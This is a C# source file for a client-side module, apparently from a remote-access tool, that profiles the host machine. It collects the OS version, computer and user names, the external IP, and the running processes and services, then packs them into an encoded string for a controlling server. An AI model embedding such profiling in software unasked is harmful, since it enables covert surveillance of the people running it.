using RSClient;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.ServiceProcess;

public class ClientInfo : IDisposable
{
    public string WinVer { get; private set; }
    public string ComputerName { get; private set; }
    public string Username { get; private set; }
    public string ActiveProcessCount { get; private set; }
    public string ExternalIP { get; private set; }
    public string ProcessList { get; private set; }
    public string ServicesList { get; private set; }
    public ClientInfo()
    {
        WinVer = "";
        ComputerName = "";
        Username = "";
        ActiveProcessCount = "";
        ExternalIP = "";
        ProcessList = "";
        GetClientInfo();
    }

    public string Data()
    {
        return WinVer.Trim() + "½" + ComputerName.Trim() + "½" + Username.Trim() + "½" + ActiveProcessCount.ToString().Trim() + "½" + ExternalIP.Trim() + "½" + Cryptography.Base64Encode(ProcessList.Trim()) + "½" + Cryptography.Base64Encode(ServicesList.Trim());
    }

    private void GetClientInfo()
    {
        ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
        foreach (ManagementObject os in searcher.Get())
        {
            WinVer = os["Caption"].ToString();
        }

        ComputerName = Environment.MachineName;
        Username = Environment.UserName;

        int Count = 0;
        Process[] Processes = Process.GetProcesses();
        foreach (Process Process in Processes)
        {
            if (Process.MainWindowHandle != IntPtr.Zero)
            {
                Count++;
            }
        }
        ActiveProcessCount = Count.ToString();

        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.ipify.org");
        request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
        using (Stream stream = response.GetResponseStream())
        using (StreamReader reader = new StreamReader(stream))
        {
            ExternalIP = reader.ReadToEnd();
        }

        foreach (Process Process in Processes)
        {
            ProcessList += Process.Id + "£%" + Process.ProcessName + ".exe\n";
        }

        foreach (ServiceController Service in ServiceController.GetServices())
        {
            ServicesList += Service.ServiceName + "£%" + Service.Status.ToString() + "\n";
        }
    }

    public void Dispose()
    {
        WinVer = "";
        ComputerName = "";
        Username = "";
        ActiveProcessCount = "";
        ExternalIP = "";
        ProcessList = "";
    }
}
